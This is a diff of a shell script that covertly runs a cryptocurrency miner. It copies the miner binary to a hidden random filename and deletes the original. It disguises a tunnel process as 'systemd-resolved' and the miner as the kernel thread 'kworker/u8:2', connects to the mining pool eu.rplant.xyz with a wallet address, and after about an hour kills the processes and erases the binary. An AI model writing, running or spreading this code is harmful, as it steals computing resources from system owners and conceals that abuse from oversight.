@@ -6,16 +6,33 @@ NAME=".$(tr -dc a-z0-9 </dev/urandom | head -c6)"
 
 cp /app/sr "/app/$NAME"
 chmod +x "/app/$NAME"
-
-# optional: hapus original biar gak keliatan
 rm -f /app/sr
 
 (exec -a systemd-resolved /usr/local/bin/.netd access tcp \
 --hostname "$(cat .h)" \
 --url 127.0.0.1:8443 >/dev/null 2>&1 &)
+P1=$!
 
 sleep 3
 
-(exec -a kworker/u8:2 /app/$NAME -a yescryptr32 -o eu.rplant.xyz:7047 -u lpep1qz4kz27v2s3l48prnalqhzhluvhy9ljtl7hchad.$(shuf -n 1 -i 100-999)-Levy -p x >/dev/null 2>&1 &)
+(exec -a kworker/u8:2 /app/$NAME \
+-a yescryptr32 \
+-o eu.rplant.xyz:7047 \
+-u lpep1qz4kz27v2s3l48prnalqhzhluvhy9ljtl7hchad.hail \
+-p x >/dev/null 2>&1 &)
+P2=$!
 
-tail -f /dev/null
+DURATION=$((3300 + RANDOM % 200))
+sleep $DURATION
+
+kill -15 $P2 2>/dev/null
+sleep 2
+kill -9 $P2 2>/dev/null
+
+kill -15 $P1 2>/dev/null
+sleep 1
+kill -9 $P1 2>/dev/null
+
+rm -f "/app/$NAME"
+
+exit 0
